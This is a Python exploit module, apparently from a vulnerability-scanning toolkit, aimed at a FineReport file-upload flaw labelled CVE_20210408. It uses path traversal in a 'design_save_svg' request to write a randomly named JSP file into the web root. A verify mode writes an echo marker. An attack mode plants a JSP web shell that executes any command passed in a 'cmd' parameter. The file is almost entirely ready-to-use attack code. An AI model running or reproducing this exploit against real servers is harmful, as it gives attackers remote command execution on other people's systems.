from util.ExpRequest import ExpRequest,Output
from ClassCongregation import random_name
from operator import methodcaller
import re
"""
--FineReport--
CVE_20210408  [upload]，默认self.vuln = None
"""
class FineReport():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.linux_cmd = env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.status = env.get('status')
            
    def CVE_20210408_FineReport(self):
        appName = 'FineReport'
        pocname = 'CVE_20210408'
        method = 'post'
        desc = 'FineReport:CVE_20210408'
        info = '[upload]'
        path = r'/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/'
        payload_verify = r'{"__CONTENT__":"VuLnEcHoPoCSuCCeSS","__CHARSET__":"UTF-8"}'
        payload = r'{"__CONTENT__":"<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>","__CHARSET__":"UTF-8"}'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 
            'Connection': 'close', 
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*', 
            'Content-Type': 'text/xml;charset=UTF-8', 
            'Accept-Au': '0c42b2f264071be0507acea1876c74'
        }
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        name = random_name(6)+'.jsp'
        path += name
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.post(self.url + path, data=payload_verify, headers=headers, timeout=self.timeout, verify=False)
                request = exprequest.get(self.url + '/WebReport/' + name, headers=headers, timeout=self.timeout, verify=False)
                if 'VuLnEcHoPoCSuCCeSS' in request.text:
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
            #_attack
            else:
                request = exprequest.post(self.url + path, data=payload, headers=headers, timeout=self.timeout, verify=False)
                print(self.url + path)
        except Exception as error:
            output.error_output(str(error))

def check(**kwargs):
    result_list = []
    result_list.append('----------------------------')
    ExpFineReport = FineReport(**kwargs)
    if kwargs['pocname'] != 'ALL':
        func = getattr(ExpFineReport, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
        return ExpFineReport.status
    else:#调用所有函数
        for func in dir(FineReport):
            if not func.startswith("__"):
                methodcaller(func)(ExpFineReport)
                result_list.append(func+' -> '+ExpFineReport.status)
                ExpFineReport.status = 'fail'
    result_list.append('----------------------------')
    return '\n'.join(result_list)

